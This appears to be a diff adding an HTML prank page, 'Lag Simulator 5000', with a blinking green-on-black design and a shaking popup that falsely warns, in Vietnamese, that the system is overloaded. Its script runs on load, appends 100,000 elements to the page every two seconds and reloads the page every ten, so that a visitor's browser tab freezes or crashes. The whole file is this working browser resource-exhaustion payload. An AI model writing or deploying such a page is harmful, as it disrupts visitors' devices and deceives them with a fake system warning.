@@ -1,0 +1,62 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lag Simulator 5000</title>
+  <style>
+    body {
+      background-color: black;
+      color: lime;
+      font-family: monospace;
+      text-align: center;
+      padding: 50px;
+    }
+    h1 {
+      font-size: 50px;
+      animation: blink 0.2s infinite;
+    }
+    @keyframes blink {
+      0% { opacity: 1; }
+      50% { opacity: 0.2; }
+      100% { opacity: 1; }
+    }
+    .popup {
+      position: fixed;
+      top: 30%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #111;
+      border: 2px solid red;
+      color: white;
+      padding: 30px;
+      font-size: 24px;
+      z-index: 9999;
+      animation: shake 0.1s infinite;
+    }
+    @keyframes shake {
+      0% { transform: translate(-50%, -50%) rotate(1deg); }
+      50% { transform: translate(-50%, -50%) rotate(-1deg); }
+      100% { transform: translate(-50%, -50%) rotate(1deg); }
+    }
+  </style>
+</head>
+<body>
+  <h1>LAGGGGGGGGGGGGGGGGGGG</h1>
+  <div class="popup">⚠️ Hệ thống đang quá tải ⚠️</div>  <script>
+    setInterval(() => {
+      for (let i = 0; i < 100000; i++) {
+        let div = document.createElement("div");
+        div.innerText = "🔧";
+        div.style.position = "absolute";
+        div.style.left = Math.random() * window.innerWidth + "px";
+        div.style.top = Math.random() * window.innerHeight + "px";
+        div.style.color = "#0f0";
+        document.body.appendChild(div);
+      }
+    }, 2000);
+
+    setInterval(() => {
+      location.reload();
+    }, 10000);
+  </script></body>
+</html>
